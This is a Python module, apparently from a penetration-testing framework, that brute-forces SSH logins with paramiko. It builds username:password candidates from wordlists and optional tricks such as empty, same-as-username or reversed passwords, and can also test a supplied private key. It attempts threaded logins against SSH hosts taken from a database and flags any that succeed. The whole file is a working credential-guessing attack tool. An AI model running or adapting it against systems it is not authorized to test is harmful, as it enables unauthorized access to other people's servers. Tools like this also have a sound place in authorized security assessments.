from lib.core.brute import BruteModule, Timing, BRUTE_STATUS_SUCCESS, BRUTE_STATUS_FAIL
import os
import paramiko


class Module(BruteModule):

    meta = {
        'name': 'SSH Login Brute Forcer',
        'author': 'Sion Dafydd',
        'description': 'Brute forces SSH logins. Updates the \'credentials\' table with the results.',
        'query': "SELECT ip_address || ':' || port FROM ports WHERE service LIKE 'ssh' AND ip_address NOT NULL",
        'options': (
            ('usernames', os.path.join(BruteModule.data_path, 'ssh_usernames.txt'), False, 'path to username wordlist file'),
            ('passwords', os.path.join(BruteModule.data_path, 'ssh_passwords.txt'), False, 'path to password wordlist file'),
            ('credentials', os.path.join(BruteModule.data_path, 'ssh_userpass.txt'), False, 'path to user:pass wordlist file'),
            ('empty_password', False, True, 'try a null/empty password for each username supplied'),
            ('username_as_password', False, True, 'try the username as password for each username supplied'),
            ('reverse_username_as_password', False, True, 'try a reversed username as password for each username supplied'),
            ('auth_type', 'password', True, 'type of password authentication to use [password|keyboard-interactive|auto]'),
            ('keyfile', None, False, 'file with RSA, DSA or ECDSA private key to test'),
            ('max_attempts', 4, True, 'skip brute attempt after N failed connections'),
            ('target_max_attempts', 4, True, 'skip target after N failed max_attempts'),
            ('rate_limit', 0, True, 'wait N seconds between each test'),
        ),
    }

    def module_run(self, targets):
        # Reset/Override base class options
        BruteModule.module_run(self)
        self.max_attempts = self.options['max_attempts']
        self.target_max_attempts = self.options['target_max_attempts'] * self.max_attempts
        self.rate_limit = self.options['rate_limit']

        # Module options
        usernames = self.load_wordlist(self.options['usernames'])
        passwords = self.load_wordlist(self.options['passwords'])
        credentials = self.load_wordlist(self.options['credentials'])

        self.auth_type = self.options['auth_type']
        self.key = None
        if self.options['keyfile'] is not None:
            self.key = self.load_keyfile(self.options['keyfile'])

        # Perform some error checking on the options that have been set
        if self.auth_type not in self.ssh_auth_types:
            self.error("Invalid 'auth_type' set")
            return

        if len(usernames) == 0 and len(credentials) == 0:
            self.error("Please set the 'usernames' and/or 'credentials' options")
            return

        if len(usernames) == 0 and (self.options['empty_password'] is not None \
                or self.options['username_as_password'] is not None \
                    or self.options['reverse_username_as_password'] is not None):
            self.error("Warning: 'empty_password', 'username_as_password', and 'reverse_username_as_password' "
                       "options are ignored without the 'usernames' option")

        if len(usernames) > 0 and len(passwords) == 0 and self.options['empty_password'] is None \
                and self.options['username_as_password'] is None \
                    and self.options['reverse_username_as_password'] is None \
                        and self.options['keyfile'] is None:
            self.error("Usernames option has been set, but no password options have been set")
            return

        # List to store attack candidates
        candidates = list()

        # Compile list of attack candidates
        if self.options['empty_password']:
            for username in usernames:
                candidates.append(username + ":")

        if self.options['username_as_password']:
            for username in usernames:
                candidates.append(username + ":" + username)

        if self.options['reverse_username_as_password']:
            for username in usernames:
                candidates.append(username + ":" + username[::-1])

        for userpass in credentials:
            candidates.append(userpass)

        for password in passwords:
            for username in usernames:
                candidates.append(username + ":" + password)

        for target in targets:
            # Output a pretty header
            self.heading(target, level=0)

            # Start attack
            self.thread(candidates, target)

    def connect(self, target):
        # Attempt to connect to the target
        ip_address, port = target.split(':')
        connection = paramiko.Transport("%s:%s" % (ip_address, int(port)))
        connection.start_client()
        return connection

    def execute(self, connection, candidate, target):
        # Attempt to authenticate to the target
        username, password = candidate.split(':')
        try:
            with Timing() as timing:
                if self.key is not None:
                    connection.auth_publickey(username, self.key)
                else:
                    if self.auth_type == 'password':
                        connection.auth_password(username, password, fallback=False)
                    elif self.auth_type == 'keyboard-interactive':
                        connection.auth_interactive(username, lambda a, b, c: [password] if len(c) == 1 else [])
                    elif self.auth_type == 'auto':
                        connection.auth_password(username, password, fallback=True)
                    else:
                        self.error('Invalid auth_type %r' % self.auth_type)
                        return
            status = BRUTE_STATUS_SUCCESS
            message = connection.remote_version
        except paramiko.AuthenticationException as e:
            status = BRUTE_STATUS_FAIL
            message = str(e)
        message = "[%s] %s:%s - %s", (target, username, password, message)
        if status == BRUTE_STATUS_SUCCESS:
            self.alert(message)
        else:
            self.debug(message)

    def load_keyfile(self, keyfile):
        for cls in (paramiko.RSAKey, paramiko.DSSKey, paramiko.ECDSAKey):
            try:
                return cls.from_private_key_file(keyfile)
            except paramiko.SSHException:
                pass
        else:
            raise

    ssh_auth_types = {
        'password': "password",
        'keyboard-interactive': "keyboard-interactive",
        'auto': "auto",
    }
